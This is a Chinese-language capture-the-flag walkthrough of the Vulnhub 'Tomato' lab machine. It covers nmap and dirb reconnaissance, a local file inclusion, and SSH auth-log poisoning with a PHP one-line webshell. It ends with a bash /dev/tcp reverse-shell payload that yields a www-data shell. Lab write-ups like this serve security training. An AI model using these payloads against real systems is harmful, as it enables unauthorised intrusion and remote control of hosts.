# Tomato

### 目标探测

Nmap扫描目标开放端口

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
└─# nmap -sV -p- 192.168.19.147 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 22:23 EDT
Nmap scan report for 192.168.19.147
Host is up (0.00086s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
8888/tcp open  http    nginx 1.10.3 (Ubuntu)
MAC Address: 00:0C:29:6E:EA:1C (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds
```

访问一下目标的80端口

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

没什么有用的信息，在看看8888端口

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

好吧，是个登录界面，让我们再回到80端口页面，dirb扫描看下有没有扫描有用的东西

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
└─# dirb http://192.168.19.147/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Sep 12 06:27:27 2023
URL_BASE: http://192.168.19.147/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.19.147/ ----
==> DIRECTORY: http://192.168.19.147/antibot_image/                                                                
+ http://192.168.19.147/index.html (CODE:200|SIZE:652)                                                             
+ http://192.168.19.147/server-status (CODE:403|SIZE:279)                                                          
                                                                                                                   
---- Entering directory: http://192.168.19.147/antibot_image/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Sep 12 06:27:30 2023
DOWNLOADED: 4612 - FOUND: 2
```

让我们访问一下/antibot\_image这个目录，发现了一些有趣的东西

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

发现info.php是一个phpinfo页面，

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

查看网页源码发现有一个注释有一个文件包含，传的参数为image

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

我们尝试一下LFI读取一下它的/etc/passwd

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

看下能否读取到它的服务日志文件，通过nmap扫描的信息可以看出它有两个web服务日志，Apache和Nginx，有关文件包含的内容我们可以查看下面这篇文章。

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion#file-inclusion" %}

我们尝试包含一下/var/log/auth.log这个文件

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

然后我们尝试以一句话木马作为用户名ssh登录

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
└─# ssh '<?php system($_GET["shell"]); ?>'@192.168.19.147 -p2211
<?php system($_GET["shell"]); ?>@192.168.19.147's password: 
Permission denied, please try again.
<?php system($_GET["shell"]); ?>@192.168.19.147's password: 
Permission denied, please try again.
<?php system($_GET["shell"]); ?>@192.168.19.147's password: 
<?php system($_GET["shell"]); ?>@192.168.19.147: Permission denied (publickey,password).
```

然后我们可以通过shell去执行命令

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

接下来通过burp的重放去反弹shell

```
bash+-c+'bash+-i+>%26+/dev/tcp/192.168.19.130/4444+0>%261'
```

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

本地监听端口返回了一个shell

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
└─# nc -lnvp 4444                           
listening on [any] 4444 ...
connect to [192.168.19.130] from (UNKNOWN) [192.168.19.147] 55536
bash: cannot set terminal process group (905): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/antibot_image/antibots$ whoami
whoami
www-data
www-data@ubuntu:/var/www/html/antibot_image/antibots$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/antibot_image/antibots$
```

